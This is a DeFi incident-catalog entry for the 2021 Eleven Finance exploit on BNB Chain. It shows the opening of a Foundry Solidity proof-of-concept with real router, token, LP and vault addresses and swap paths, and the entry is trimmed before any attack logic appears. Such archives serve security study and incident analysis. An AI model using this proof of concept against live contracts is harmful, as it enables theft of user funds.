# [?] Eleven Finance - Doesn’t burn shares

## Summary
Severity: Unknown
Chain: BNB Chain
Component: Eleven
Published: 2021-06-22
Source: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2021-06/Eleven_exp.sol
Type: defi-exploit-poc

## Details
```solidity
// SPDX-License-Identifier: UNLICENSED
//Credit: Cache_And_Burn

pragma solidity 0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

/*
Eleven Finance Exploit POC

tx hash: 0x6450d8f4db09972853e948bee44f2cb54b9df786dace774106cd28820e906789

https://peckshield.medium.com/eleven-finance-incident-root-cause-analysis-123b5675fa76*/

contract Eleven is Test {
    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

    IPancakeRouter router = IPancakeRouter(payable(0x10ED43C718714eb63d5aA57B78B54704E256024E));

    IPancakePair cake_LP = IPancakePair(0x401479091d0F7b8AE437Ee8B054575cd33ea72Bd);

    IERC20 nrv = IERC20(0x42F6f551ae042cBe50C739158b4f0CAC0Edb9096);

    IERC20 busd = IERC20(0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56);

    IWBNB wbnb = IWBNB(payable(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c));

    address public ape_lp = 0x51e6D27FA57373d8d4C256231241053a70Cb1d93;

    IElevenNeverSellVault vault = IElevenNeverSellVault(0x27DD6E51BF715cFc0e2fe96Af26fC9DED89e4BE8);

    //Path from BUSD --> NRV
    address[] path_1 = [0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56, 0x42F6f551ae042cBe50C739158b4f0CAC0Edb9096];

    //Path from NRV --> BUSD
    address[] path_2 = [0x42F6f551ae042cBe50C739158b4f0CAC0Edb9096, 0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56];
```

_Trimmed to 38 lines — full report: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2021-06/Eleven_exp.sol_
